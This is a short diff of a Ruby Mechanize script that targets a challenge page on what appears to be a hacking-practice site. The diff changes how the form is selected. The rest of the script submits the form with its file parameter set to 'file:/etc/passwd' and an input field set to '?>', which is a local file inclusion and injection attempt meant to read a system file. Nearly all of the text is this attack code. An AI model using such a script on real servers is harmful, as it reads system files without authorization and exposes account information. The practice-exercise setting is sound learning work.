@@ -6,7 +6,7 @@ uri=URI.parse('http://www.hackerschool.jp/hack/take43.php')
 #str='PHPSESSID='
 #Mechanize::Cookie.parse(uri, str){|c|mech.cookie_jar.add(uri, c)}
 mech.get(uri)
-form=mech.page.forms[4]
+form=mech.page.form_with(:action=>'/hack/take43.php?file=take43.html')
 file='file:/etc/passwd'
 form.action='/hack/take43.php?file='+file
 form.input_id='?>'
